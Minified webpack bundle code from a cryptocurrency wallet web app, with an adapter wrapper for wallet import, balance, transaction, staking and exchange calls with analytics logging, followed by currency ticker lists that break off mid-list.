(self.webpackChunkheygarden = self.webpackChunkheygarden || []).push([[4497], {
    86239: (e, t, a) => {
        "use strict";
        a.d(t, {
            L: () => n
        });
        let n;
        !function(e) {
            e.main = "main";
            e.token = "token"
        }(n || (n = {}))
    }
    ,
    17995: (e, t, a) => {
        "use strict";
        a.d(t, {
            Z: () => w
        });
        var n = a(31672), r = a(2490), l = a(59461), s = a(51231), i = a.n(s), o = a(52434), c = a(42693), u = a.n(c), d = a(10956), m;
        const p = a.n(d)()((async e => {
            const t = undefined;
            return await u()((async () => {
                const t = undefined;
                return await a(47714)(`./${e}.js`)
            }
            ), {
                retries: 5
            })
        }
        ));
        var f = a(41817)
          , E = a(919)
          , h = a(91779)
          , g = a.n(h)
          , y = a(59351)
          , v = a(69470);
        function _defineProperty(e, t, a) {
            (t = _toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function _toPropertyKey(e) {
            var t = _toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function _toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class AdapterWrapper {
            constructor(e) {
                var t = this;
                _defineProperty(this, "__adapter", void 0);
                _defineProperty(this, "currency", void 0);
                _defineProperty(this, "hasSupportedGetBalance", void 0);
                _defineProperty(this, "hasSupportedGetTransactions", void 0);
                _defineProperty(this, "_getCurrency", (function() {
                    var e;
                    let a = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                    const n = a.currency || t.__adapter.currency || (null === (e = t.__adapter.options) || void 0 === e ? void 0 : e.currency);
                    if (["usdt", "matic"].includes(n)) {
                        var r, l;
                        const e = (null === (r = t.__adapter.network) || void 0 === r ? void 0 : r.ticker) || (null === (l = t.__adapter.options) || void 0 === l ? void 0 : l.family) || t.__adapter.family;
                        return e ? `${n}_${e}` : n
                    }
                    return n
                }
                ));
                _defineProperty(this, "_getImportKey", (e => "xprv" === e.slice(0, 4) ? "xprv" : String(e).split(" ").length > 4 ? "mnemonic" : 64 === e.length ? "private_key" : "wif"));
                _defineProperty(this, "createWallet", (async e => {
                    try {
                        return await this.__adapter.createWallet(e)
                    } catch (t) {
                        console.warn(t);
                        E.b.error(E.d.FAILED_CREATE_WALLET, {
                            currency: this._getCurrency(e)
                        }, t);
                        return {
                            error: "Failed create wallet"
                        }
                    }
                }
                ));
                _defineProperty(this, "getAddressFromPrivateKey", (async e => {
                    try {
                        const t = await this.__adapter.getAddressFromPrivateKey(e);
                        E.b.success(E.d.IMPORT_WALLET_SUCCESS, {
                            key_currency: this._getCurrency(e),
                            import_key: "string" == typeof e.privateKey && this._getImportKey(e.privateKey)
                        });
                        v.$.send(v.d.WALLET_IMPORT, this.currency);
                        return t
                    } catch (t) {
                        console.warn(t);
                        E.b.error(E.d.IMPORT_WALLET_ERROR, {
                            currency: this._getCurrency(e),
                            import_key: "string" == typeof e.privateKey && this._getImportKey(e.privateKey)
                        }, t);
                        return t.errorCode ? {
                            error: {
                                text: "Failed import wallet",
                                code: t.errorCode
                            }
                        } : {
                            error: "Failed import wallet"
                        }
                    }
                }
                ));
                _defineProperty(this, "getAddressFromMnemonic", (async e => {
                    let {mnemonic: t, accountIndex: a, type: n, code: r} = e;
                    try {
                        return await this.__adapter.getAddressFromMnemonic({
                            mnemonic: t,
                            accountIndex: a,
                            code: r,
                            type: n
                        })
                    } catch (e) {
                        console.warn(e);
                        E.b.error(E.d.GET_ADDRESS_FROM_MNEMONIC_ERROR, {
                            currency: this.currency,
                            accountIndex: a,
                            ...r ? {
                                code: r
                            } : {}
                        }, e);
                        return {
                            error: "Failed get address from mnemonic"
                        }
                    }
                }
                ));
                _defineProperty(this, "getAccountFromMnemonicAndAddress", (async e => {
                    try {
                        return await this.__adapter.getAccountFromMnemonicAndAddress(e)
                    } catch (e) {
                        return {
                            error: e
                        }
                    }
                }
                ));
                _defineProperty(this, "getBalanceByAddress", (async e => {
                    try {
                        return this.hasSupportedGetBalance ? await this.__adapter.getBalanceByAddress(e) : null
                    } catch (t) {
                        console.warn(t);
                        const a = this._getCurrency(e);
                        null == e || delete e.viewKey;
                        E.b.error(E.d.FAILED_GET_BALANCE, {
                            currency: a
                        }, t, {
                            ...e,
                            currencyFrom: a
                        });
                        return {
                            error: "Failed get balance by wallet"
                        }
                    }
                }
                ));
                _defineProperty(this, "getTransactionsByAddress", (async e => {
                    try {
                        return this.hasSupportedGetTransactions ? await this.__adapter.getTransactionsByAddress(e) : null
                    } catch (t) {
                        console.warn(t);
                        const a = this._getCurrency(e);
                        null == e || delete e.viewKey;
                        E.b.error(E.d.FAILED_GET_TXS, {
                            currency: a
                        }, t, {
                            ...e,
                            currencyFrom: a
                        });
                        return []
                    }
                }
                ));
                _defineProperty(this, "sendTransaction", (async e => {
                    let t;
                    const a = this._getCurrency(e);
                    let n = null;
                    const r = setTimeout(( () => {
                        E.b.error(E.d.BRODCASTING_TRANSACTION_IS_TOO_LONG, {
                            currency: a
                        }, {
                            ...e,
                            currency: a
                        })
                    }
                    ), 3e3);
                    try {
                        E.b.success(E.d.BRODCASTING_TRANSACTION, {
                            currency: a
                        }, "false", {
                            ...e,
                            currency: a
                        });
                        const l = await this.__adapter.sendTransaction(e);
                        if (l.hash) {
                            v.$.send(v.d.TX_SEND, e.currencyFrom, {
                                hash: l.hash
                            });
                            if (e.exchangeId) {
                                t = E.d.EXCHANGE_SUCCESS;
                                n = e.exchangeId
                            } else
                                t = e.staking ? E.d.STAKE_SUCCESS : e.claim ? E.d.CLAIM_SUCCESS : E.d.SEND_SUCCESS;
                            const r = {
                                currency: a,
                                txHash: l.hash
                            };
                            n && Object.assign(r, {
                                exchange_id: n
                            });
                            E.b.success(t, r, "false", {
                                ...e,
                                currency: a
                            })
                        }
                        return l
                    } catch (n) {
                        console.warn(n);
                        t = e.exchangeId ? E.d.FAILED_EXCHANGE : e.staking ? E.d.FAILED_STAKE : e.claim ? E.d.FAILED_CLAIM : E.d.FAILED_SEND;
                        null == e || delete e.viewKey;
                        E.b.error(t, {
                            currency: a
                        }, n, {
                            ...e,
                            currency: a
                        });
                        v.$.send(v.d.TX_SEND_FAILED, e.currencyFrom);
                        if (e.exchangeId)
                            try {
                                await (0,
                                y.Z)(e.exchangeId, n)
                            } catch {}
                        return n.errorCode ? {
                            error: {
                                text: "Failed send tx",
                                code: n.errorCode,
                                cause: null == n ? void 0 : n.cause
                            }
                        } : {
                            error: "Failed send tx"
                        }
                    } finally {
                        clearTimeout(r)
                    }
                }
                ));
                _defineProperty(this, "sendSparkAirdropTransaction", (async e => {
                    try {
                        const t = await this.__adapter.sendSparkAirdropTransaction(e);
                        v.$.send(v.d.TX_SEND, e.currencyFrom, {
                            hash: t.hash
                        });
                        return t
                    } catch (t) {
                        const a = this._getCurrency(e);
                        null == e || delete e.viewKey;
                        E.b.error(E.d.FAILED_XRP_AIRDROP, {
                            currency: a
                        }, t, {
                            ...e,
                            currencyFrom: a
                        });
                        if (e.exchangeId)
                            try {
                                await (0,
                                y.Z)(e.exchangeId, t)
                            } catch (e) {}
                        return t.errorCode ? {
                            error: {
                                text: "Failed send tx",
                                code: t.errorCode
                            }
                        } : {
                            error: "Failed send tx"
                        }
                    }
                }
                ));
                _defineProperty(this, "sendAccountDeleteTransaction", (async e => {
                    try {
                        return await this.__adapter.sendAccountDeleteTransaction(e)
                    } catch (t) {
                        const a = this._getCurrency(e);
                        E.b.error(E.d.FAILED_XRP_DELETE_ACCOUNT, {
                            currency: a
                        }, t, {
                            ...e,
                            currencyFrom: a
                        });
                        return {
                            error: "Failed delete XRP account"
                        }
                    }
                }
                ));
                _defineProperty(this, "sendCommonTransaction", (async e => {
                    try {
                        const t = await this.__adapter.sendCommonTransaction(e);
                        v.$.send(v.d.TX_SEND, e.currencyFrom, {
                            hash: t.hash
                        });
                        return t
                    } catch (t) {
                        console.warn(t);
                        const a = this._getCurrency(e);
                        E.b.error(E.d.FAILED_SEND_COMMON, {
                            currency: a
                        }, t, {
                            ...e,
                            currencyFrom: a
                        });
                        return {
                            error: "Failed send tx"
                        }
                    }
                }
                ));
                _defineProperty(this, "getFee", (async e => {
                    try {
                        return await this.__adapter.getFee(e)
                    } catch (t) {
                        if (t.errorCode === g().INSUFFICIENT_FUNDS)
                            return {
                                error: t.message
                            };
                        if (t.message && t.message.includes("more") && t.message.includes("decimal"))
                            return {
                                error: t.message
                            };
                        console.warn(t);
                        const a = this._getCurrency(e);
                        E.b.error(E.d.FAILED_GET_FEE, {
                            currency: a
                        }, t, {
                            ...e,
                            currencyFrom: a
                        });
                        return {
                            error: "Failed get fee"
                        }
                    }
                }
                ));
                _defineProperty(this, "claimReward", (async e => {
                    const t = this._getCurrency(e);
                    try {
                        const a = await this.__adapter.claimReward(e);
                        E.b.error(E.d.CLAIM_SUCCESS, {
                            currency: t
                        }, "false", {
                            ...e,
                            currencyFrom: t
                        });
                        return a
                    } catch (t) {
                        console.warn(t);
                        E.b.error(E.d.FAILED_KMD_CLAIM, {
                            currency: this._getCurrency(e)
                        }, t, e);
                        return {
                            error: "Failed kmd claim"
                        }
                    }
                }
                ));
                _defineProperty(this, "createInvoice", (async e => {
                    try {
                        return await this.__adapter.createInvoice(e)
                    } catch (t) {
                        console.warn(t);
                        const a = this._getCurrency(e);
                        E.b.error(E.d.FIO_FAILED_CREATE_INVOICE, {
                            currency: a
                        }, t, {
                            ...e,
                            currencyFrom: a
                        });
                        return {
                            error: "Failed to create invoice"
                        }
                    }
                }
                ));
                _defineProperty(this, "confirmInvoicePayment", (async e => {
                    try {
                        return await this.__adapter.confirmInvoicePayment(e)
                    } catch (t) {
                        console.warn(t);
                        const a = this._getCurrency(e);
                        E.b.error(E.d.FIO_FAILED_APPROVE_INVOICE, {
                            currency: a
                        }, t, {
                            ...e,
                            currencyFrom: a
                        });
                        return {
                            error: "Failed to confirm invoice"
                        }
                    }
                }
                ));
                _defineProperty(this, "rejectInvoice", (async e => {
                    try {
                        return await this.__adapter.rejectInvoice(e)
                    } catch (t) {
                        console.warn(t);
                        const a = this._getCurrency(e);
                        E.b.error(E.d.FIO_FAILED_REJECT_INVOICE, {
                            currency: a
                        }, t, {
                            ...e,
                            currencyFrom: a
                        });
                        return {
                            error: "Failed to reject invoice"
                        }
                    }
                }
                ));
                _defineProperty(this, "addPublicAddresses", (async e => {
                    try {
                        return await this.__adapter.addPublicAddresses(e)
                    } catch (t) {
                        console.warn(t);
                        const a = this._getCurrency(e);
                        E.b.error(E.d.CLO_FAILED_WITHDRAW_STAKING, {
                            currency: a
                        }, t, {
                            ...e,
                            currencyFrom: a
                        });
                        return {
                            error: "Failed to add addresses"
                        }
                    }
                }
                ));
                _defineProperty(this, "withdraw", (async (e, t, a) => {
                    try {
                        E.b.error(E.d.UNSTAKE_SUCCESS, {
                            currency: this._getCurrency()
                        }, "false", {
                            currency: this._getCurrency()
                        });
                        return await this.__adapter.withdraw(e, t, a)
                    } catch (e) {
                        console.warn(e);
                        E.b.error(E.d.FAILED_UNSTAKE, {
                            currency: this._getCurrency()
                        }, e, {
                            currency: this._getCurrency()
                        });
                        throw e
                    }
                }
                ));
                _defineProperty(this, "stake", (async e => {
                    const t = {
                        currency: this._getCurrency(),
                        validator: e.validatorAddress,
                        amount: e.amount
                    };
                    try {
                        const a = await this.__adapter.stake(e);
                        a.error && E.b.error(E.d.FAILED_STAKE, {
                            currency: this._getCurrency()
                        }, a.error, t);
                        a.hash && E.b.success(E.d.STAKE_SUCCESS, {
                            currency: this._getCurrency()
                        }, "false", t);
                        return a
                    } catch (e) {
                        console.warn(e);
                        E.b.error(E.d.FAILED_STAKE, {
                            currency: this._getCurrency()
                        }, e, t);
                        throw e
                    }
                }
                ));
                _defineProperty(this, "sendStakingTransaction", (async e => {
                    try {
                        const t = await this.__adapter.sendStakingTransaction(e);
                        "error"in t && null != t && t.error && E.b.error(E.d.FAILED_STAKE, {
                            currency: this._getCurrency()
                        }, null == t ? void 0 : t.error, {
                            currency: this._getCurrency(),
                            ...e.params
                        });
                        E.b.success(E.d.STAKE_SUCCESS, {
                            currency: this._getCurrency()
                        }, "false", {
                            currency: this._getCurrency(),
                            ...e.params
                        });
                        return t
                    } catch (t) {
                        console.warn(t);
                        E.b.error(E.d.FAILED_STAKE, {
                            currency: this._getCurrency()
                        }, t, {
                            currency: this._getCurrency(),
                            ...e.params
                        });
                        throw t
                    }
                }
                ));
                _defineProperty(this, "unstake", (async e => {
                    const t = {
                        currency: this._getCurrency(),
                        validator: e.validatorAddress,
                        amount: e.amount
                    };
                    try {
                        const a = await this.__adapter.unstake(e);
                        a.error && E.b.error(E.d.FAILED_UNSTAKE, {
                            currency: this._getCurrency()
                        }, a.error, t);
                        a.hash && E.b.success(E.d.UNSTAKE_SUCCESS, {
                            currency: this._getCurrency()
                        }, "false", t);
                        return a
                    } catch (e) {
                        console.warn(e);
                        E.b.error(E.d.FAILED_UNSTAKE, {
                            currency: this._getCurrency()
                        }, e, t);
                        throw e
                    }
                }
                ));
                _defineProperty(this, "claim", (async (e, t, a) => {
                    const n = "string" != typeof e ? null == e ? void 0 : e.validatorAddress : ""
                      , r = {
                        currency: this._getCurrency(),
                        validator: n
                    };
                    try {
                        let n;
                        if ("string" == typeof e)
                            n = await this.__adapter.claim(e, t, a);
                        else {
                            n = await this.__adapter.claim(e);
                            n.error && E.b.error(E.d.FAILED_CLAIM, {
                                currency: this._getCurrency()
                            }, n.error, r)
                        }
                        E.b.error(E.d.CLAIM_SUCCESS, {
                            currency: this._getCurrency()
                        }, "false", r);
                        return n
                    } catch (e) {
                        console.warn(e);
                        E.b.error(E.d.FAILED_CLAIM, {
                            currency: this._getCurrency()
                        }, e, r);
                        throw e
                    }
                }
                ));
                _defineProperty(this, "login", (async e => {
                    const t = {
                        currency: this._getCurrency(),
                        address: e.address
                    };
                    try {
                        const a = await this.__adapter.login(e);
                        a.error ? E.b.error(E.d.SYNC_XMR_FAILED, {
                            currency: this._getCurrency()
                        }, a.error, t) : E.b.success(E.d.SYNC_XMR_START, {
                            currency: this._getCurrency()
                        }, "false", t);
                        return a
                    } catch (e) {
                        E.b.error(E.d.SYNC_XMR_FAILED, {
                            currency: this._getCurrency()
                        }, e, t);
                        throw e
                    }
                }
                ));
                _defineProperty(this, "checkAndApproveTransaction", (async e => {
                    null != e && e.requiredAmount && (e.requiredAmount = e.requiredAmount.replace(/\s/g, ""));
                    try {
                        const t = undefined;
                        return await this.__adapter.checkAndApproveTokenWithPrivateKey({
                            params: e
                        })
                    } catch (e) {
                        E.b.error(E.d.FAILED_APPROVE_EXCHANGE, {
                            currency: this._getCurrency()
                        }, e);
                        throw e
                    }
                }
                ));
                _defineProperty(this, "signAndSendTransaction", (async e => {
                    try {
                        const t = undefined;
                        return await this.__adapter.sendSwftTransaction({
                            params: e
                        })
                    } catch (e) {
                        E.b.error(E.d.FAILED_SEND_DEX_EXCHANGE, {
                            currency: this._getCurrency()
                        }, e);
                        throw e
                    }
                }
                ));
                this.__adapter = e;
                this.hasSupportedGetBalance = !!e.getBalanceByAddress;
                this.hasSupportedGetTransactions = !!e.getTransactionsByAddress;
                Object.setPrototypeOf(this, e)
            }
            getAccountFromMnemonicAndAddressDestructor() {
                this.__adapter.getAccountFromMnemonicAndAddressDestructor()
            }
        }
        var _ = a(86239);
        class ExtendedLoader extends o.Loader {
            async loadWrappedFullAdapter(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                const a = await super.loadFullAdapter(e, t);
                if (void 0 === a)
                    return;
                const n = undefined;
                return new AdapterWrapper(a)
            }
            getApiByCurrency(e) {
                return this.loadWrappedFullAdapter({
                    ticker: e,
                    tokens: !1
                })
            }
            getApiByMultisig(e) {
                const t = Boolean(e.smartContract);
                return this.loadWrappedFullAdapter({
                    ticker: t ? e.family : e.currency,
                    tokens: t
                }, {
                    currency: e.currency,
                    smartContract: e.smartContract
                })
            }
            getMetadataByWallet(e) {
                const t = Boolean(e.family)
                  , a = undefined;
                return this.getMetadata({
                    ticker: t ? e.family : e.currency,
                    tokens: t
                })
            }
            getApiByWallet(e, t) {
                const a = e.adapterType || (e.family && e.family !== e.currency ? _.L.token : _.L.main)
                  , n = e.adapterTicker || (a === _.L.token ? e.family : e.currency)
                  , r = a === _.L.token || (null == e ? void 0 : e.currency.toLowerCase()) !== (null == n ? void 0 : n.toLowerCase());
                let l = e.precision;
                if (r && t) {
                    const a = t.find((t => t.ticker === e.currency && t.family === e.family && t.contract === e.smartContract));
                    null != a && a.decimals && (l = a.decimals)
                }
                return this.loadWrappedFullAdapter({
                    ticker: n,
                    tokens: r
                }, {
                    currency: e.currency,
                    precision: l,
                    smartContract: e.smartContract
                })
            }
            getApiByMultisigTransaction(e) {
                const t = Boolean(e.smartContract);
                return this.loadWrappedFullAdapter({
                    ticker: t ? e.familyMultisig : e.currencyTx,
                    tokens: t
                })
            }
            hasLightAdapterByWallet(e) {
                if (e.family && e.family !== e.currency) {
                    const t = undefined;
                    return void 0 !== i().tokens[e.family]
                }
                const t = undefined;
                return void 0 !== i().coins[e.currency]
            }
            loadLightAdapterByWallet(e) {
                const t = Boolean(e.family) && e.family !== e.currency;
                return this.loadLightAdapter({
                    ticker: t ? e.family : e.currency,
                    tokens: t
                })
            }
            loadLightAdapter(e) {
                if (e.tokens) {
                    const t = i().tokens[e.ticker];
                    return void 0 === t ? Promise.resolve(void 0) : Promise.resolve(new t(this.getApiInstance()))
                }
                const t = i().coins[e.ticker];
                return void 0 === t ? Promise.resolve(void 0) : Promise.resolve(new t(this.getApiInstance()))
            }
        }
        const w = new ExtendedLoader({
            loadScript: p
        })
    }
    ,
    86012: (e, t, a) => {
        "use strict";
        a.d(t, {
            Y: () => n,
            H: () => r
        });
        const n = [{
            ticker: "USD",
            title: "US Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "EUR",
            title: "Euro",
            isFiat: !0,
            icon: "€"
        }, {
            ticker: "RUB",
            title: "Russian Ruble",
            isFiat: !0,
            icon: "₽"
        }, {
            ticker: "AUD",
            title: "Australian Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "KRW",
            title: "South Korean won",
            isFiat: !0,
            icon: "₩"
        }, {
            ticker: "CHF",
            title: "Swiss Franc",
            isFiat: !0,
            icon: "₣"
        }, {
            ticker: "CZK",
            title: "Czech Koruna",
            isFiat: !0,
            icon: "Kč"
        }, {
            ticker: "DKK",
            title: "Danish Krone",
            isFiat: !0,
            icon: "kr"
        }, {
            ticker: "NOK",
            title: "Norwegian Krone",
            isFiat: !0,
            icon: "NKr"
        }, {
            ticker: "NZD",
            title: "New Zealand Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "PLN",
            title: "Polish Złoty",
            isFiat: !0,
            icon: "zł"
        }, {
            ticker: "SEK",
            title: "Swedish Kronor",
            isFiat: !0,
            icon: "kr"
        }, {
            ticker: "TRY",
            title: "Turkish Lira",
            isFiat: !0,
            icon: "₺"
        }, {
            ticker: "GBP",
            title: "Pound Sterling",
            isFiat: !0,
            icon: "£"
        }, {
            ticker: "CAD",
            title: "Canadian Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "HUF",
            title: "Hungarian forint",
            isFiat: !0,
            icon: "Ft"
        }, {
            ticker: "ILS",
            title: "Israeli New Shekel",
            isFiat: !0,
            icon: "₪"
        }, {
            ticker: "INR",
            title: "Indian Rupees",
            isFiat: !0,
            icon: "₹"
        }, {
            ticker: "HKD",
            title: "Hong Kong Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "MYR",
            title: "Malaysian Ringgit",
            isFiat: !0,
            icon: "RM"
        }, {
            ticker: "SGD",
            title: "Singapore Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "BGN",
            title: "Bulgarian lev",
            isFiat: !0,
            icon: "лв"
        }, {
            ticker: "BRL",
            title: "Brazilian Real",
            isFiat: !0,
            icon: "R$"
        }, {
            ticker: "MXN",
            title: "Mexican peso",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "AED",
            title: "Dirham",
            isFiat: !0,
            icon: "Dh"
        }, {
            ticker: "NGN",
            title: "Naira",
            isFiat: !0,
            icon: "₦"
        }, {
            ticker: "TWD",
            title: "New Taiwan Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "MAD",
            title: "Moroccan Dirham",
            isFiat: !0,
            icon: "د.م."
        }, {
            ticker: "RON",
            title: "Romanian Leu",
            isFiat: !0,
            icon: "L"
        }, {
            ticker: "UAH",
            title: "Ukranian Hryvnia",
            isFiat: !0,
            icon: "₴"
        }, {
            ticker: "ZAR",
            title: "South African Rand",
            isFiat: !0,
            icon: "R"
        }, {
            ticker: "ARS",
            title: "Argentine Peso",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "AZN",
            title: "Azerbaijanian New Manat",
            isFiat: !0,
            icon: "₼"
        }, {
            ticker: "CLP",
            title: "Chilean Peso",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "COP",
            title: "Colombian Peso",
            isFiat: !0,
            icon: "COL$"
        }, {
            ticker: "CRC",
            title: "Costa Rican Colon",
            isFiat: !0,
            icon: "₡"
        }, {
            ticker: "DOP",
            title: "Dominican Peso",
            isFiat: !0,
            icon: "RD$"
        }, {
            ticker: "IDR",
            title: "Indonesian Rupiah",
            isFiat: !0,
            icon: "Rp"
        }, {
            ticker: "JPY",
            title: "Japanese Yen",
            isFiat: !0,
            icon: "¥"
        }, {
            ticker: "GEL",
            title: "Georgian Lari",
            isFiat: !0,
            icon: "₾"
        }, {
            ticker: "KZT",
            title: "Kazakhstani Tenge",
            isFiat: !0,
            icon: "₸"
        }, {
            ticker: "MDL",
            title: "Moldovan Leu",
            isFiat: !0,
            icon: "L"
        }, {
            ticker: "NAD",
            title: "Namibia Dollar",
            isFiat: !0,
            icon: "N$"
        }, {
            ticker: "PEN",
            title: "Peruvian Sol",
            isFiat: !0,
            icon: "S/."
        }, {
            ticker: "UYU",
            title: "Peso Uruguayo",
            isFiat: !0,
            icon: "$U"
        }, {
            ticker: "PHP",
            title: "Philippine Peso",
            isFiat: !0,
            icon: "₱"
        }, {
            ticker: "QAR",
            title: "Qatari Riyal",
            isFiat: !0,
            icon: "QR"
        }, {
            ticker: "SAR",
            title: "Saudi riya",
            isFiat: !0,
            icon: "SR"
        }, {
            ticker: "UZS",
            title: "Uzbekistan Sum",
            isFiat: !0,
            icon: "So'm"
        }, {
            ticker: "VND",
            title: "Vietnamese Dong",
            isFiat: !0,
            icon: "₫"
        }, {
            ticker: "CNY",
            title: "Chinese Yuan",
            isFiat: !0,
            icon: "¥"
        }, {
            ticker: "XAF",
            title: "Central African CFA franc",
            isFiat: !0,
            icon: "CFA"
        }, {
            ticker: "ANG",
            title: "Netherlands Antillean Guilder",
            isFiat: !0,
            icon: "NAƒ"
        }, {
            ticker: "KWD",
            title: "Kuwaiti dinar",
            isFiat: !0,
            icon: "KD"
        }, {
            ticker: "THB",
            title: "Thai Baht ",
            isFiat: !0,
            icon: "฿"
        }, {
            ticker: "GTQ",
            title: "Guatemalan Quetzal",
            isFiat: !0,
            icon: "Q"
        }, {
            ticker: "ZMW",
            title: " Zambian Kwacha",
            isFiat: !0,
            icon: "ZK"
        }, {
            ticker: "OMR",
            title: "Omani rial",
            isFiat: !0,
            icon: "R.O."
        }, {
            ticker: "KES",
            title: " Kenyan Shilling",
            isFiat: !0,
            icon: "KSh"
        }, {
            ticker: "BND",
            title: "Brunei Dollar ",
            isFiat: !0,
            icon: "B$"
        }, {
            ticker: "RSD",
            title: "Serbian Dinar ",
            isFiat: !0,
            icon: "din"
        }, {
            ticker: "MZN",
            title: "Mozambican metical ",
            isFiat: !0,
            icon: "MT"
        }, {
            ticker: "HRK",
            title: "Croatian Kuna",
            isFiat: !0,
            icon: "kn"
        }, {
            ticker: "BOB",
            title: "Bolivian Boliviano",
            isFiat: !0,
            icon: "Bs"
        }, {
            ticker: "EGP",
            title: "Egyptian Pound",
            isFiat: !0,
            icon: "E£"
        }, {
            ticker: "BHD",
            title: "Bahraini Dinar",
            isFiat: !0,
            icon: "BD"
        }, {
            ticker: "BWP",
            title: " Botswanan Pula ",
            isFiat: !0,
            icon: "P"
        }, {
            ticker: "ALL",
            title: "Albanian Lek",
            isFiat: !0,
            icon: "L"
        }, {
            ticker: "AMD",
            title: "Armenian Dram",
            isFiat: !0,
            icon: "֏"
        }, {
            ticker: "BAM",
            title: "Bosnian Convertible Mark",
            isFiat: !0,
            icon: "KM"
        }, {
            ticker: "BBD",
            title: "Barbadian Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "BDT",
            title: "Bangladeshi Taka",
            isFiat: !0,
            icon: "Tk"
        }, {
            ticker: "BMD",
            title: "Bermudian Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "BYN",
            title: "Belarusian Ruble",
            isFiat: !0,
            icon: "Br"
        }, {
            ticker: "DJF",
            title: "Djiboutian Franc",
            isFiat: !0,
            icon: "Franc"
        }, {
            ticker: "GHS",
            title: "Ghanaian Cedi",
            isFiat: !0,
            icon: "GH¢"
        }, {
            ticker: "HNL",
            title: "Honduran Lempira",
            isFiat: !0,
            icon: "L"
        }, {
            ticker: "ISK",
            title: "Icelandic Króna",
            isFiat: !0,
            icon: "kr"
        }, {
            ticker: "JMD",
            title: "Jamaican Dollar",
            isFiat: !0,
            icon: "J$"
        }, {
            ticker: "KGS",
            title: "Kyrgyzstani Som",
            isFiat: !0,
            icon: "лв"
        }, {
            ticker: "KHR",
            title: "Cambodian Riel",
            isFiat: !0,
            icon: "៛"
        }, {
            ticker: "KYD",
            title: "Caymanian Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "LBP",
            title: "Lebanese Pound",
            isFiat: !0,
            icon: "ل.ل"
        }, {
            ticker: "LKR",
            title: "Sri Lankan Rupee",
            isFiat: !0,
            icon: "₨"
        }, {
            ticker: "MKD",
            title: "Macedonian Denar",
            isFiat: !0,
            icon: "ден"
        }, {
            ticker: "MNT",
            title: "Mongolian Tughrik",
            isFiat: !0,
            icon: "₮"
        }, {
            ticker: "MOP",
            title: "Macau Pataca",
            isFiat: !0,
            icon: "MOP$"
        }, {
            ticker: "MUR",
            title: "Mauritian Rupee",
            isFiat: !0,
            icon: "₨"
        }, {
            ticker: "PAB",
            title: "Panamanian Balboa",
            isFiat: !0,
            icon: "B/."
        }, {
            ticker: "PGK",
            title: "Papua New Guinean Kina",
            isFiat: !0,
            icon: "K"
        }, {
            ticker: "PKR",
            title: "Pakistan Rupee",
            isFiat: !0,
            icon: "₨"
        }, {
            ticker: "PYG",
            title: "Paraguayan Guarani",
            isFiat: !0,
            icon: "Gs"
        }, {
            ticker: "SOS",
            title: "Somali Shilling",
            isFiat: !0,
            icon: "S"
        }, {
            ticker: "TTD",
            title: "Trinidadian Dollar",
            isFiat: !0,
            icon: "TT$"
        }, {
            ticker: "TZS",
            title: "Tanzanian Shilling",
            isFiat: !0,
            icon: "Shilling"
        }, {
            ticker: "UGX",
            title: "Ugandan Shilling",
            isFiat: !0,
            icon: "UGX"
        }]
          , r = [{
            ticker: "EUR",
            title: "Euro",
            isFiat: !0,
            icon: "€"
        }, {
            ticker: "GBP",
            title: "Pound Sterling",
            isFiat: !0,
            icon: "£"
        }]
    }
    ,
    4406: (e, t, a) => {
        "use strict";
        a.d(t, {
            W: () => n
        });
        const n = [{
            ticker: "USD",
            title: "US Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "EUR",
            title: "Euro",
            isFiat: !0,
            icon: "€"
        }, {
            ticker: "BTC",
            title: "Bitcoin",
            isFiat: !1,
            icon: "₿"
        }, {
            ticker: "ETH",
            title: "Ethereum",
            isFiat: !1,
            icon: "Ξ"
        }, {
            ticker: "AUD",
            title: "Australian Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "BGN",
            title: "Bulgarian Lev",
            isFiat: !0,
            icon: "лв"
        }, {
            ticker: "BRL",
            title: "Brazilian Real",
            isFiat: !0,
            icon: "R$"
        }, {
            ticker: "CAD",
            title: "Canadian Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "CHF",
            title: "Swiss Franc",
            isFiat: !0,
            icon: "₣"
        }, {
            ticker: "CNY",
            title: "China Yuan",
            isFiat: !0,
            icon: "元"
        }, {
            ticker: "CZK",
            title: "Czech Koruna",
            isFiat: !0,
            icon: "Kč"
        }, {
            ticker: "DKK",
            title: "Danish Krone",
            isFiat: !0,
            icon: "kr"
        }, {
            ticker: "GBP",
            title: "Pound Sterling",
            isFiat: !0,
            icon: "£"
        }, {
            ticker: "HKD",
            title: "Hong Kong Dollar",
            isFiat: !0,
            icon: "$"
        }, {
            ticker: "HRK",
            title: "Croatian Kuna",
            isFiat: !0,
            icon: "kn"
        }, {
            ticker: "HUF",
            title: "Hungarian Forint",
            isFiat: !0,
            icon: "Ft"
        }, {
            ticker: "IDR",
            title: "Indonesian Rupiah",
            isFiat: !0,
            icon: "Rp"
        }, {
            ticker: "ILS",
            title: "Israeli New Shekel",
            isFiat: !0,
            icon: "₪"
        }, {
            ticker: "INR",
            title: "Indian Rupees",
            isFiat: !0,
            icon: "₹"
        }, {
            ticker: "ISK",
            title: "Icelandic Króna",
            isFiat: !0,
            icon: "kr"
        }, {
            ticker: "JPY",
            title: "Japanese Yen",
            isFiat: !0,
            icon: "¥"
        }, {
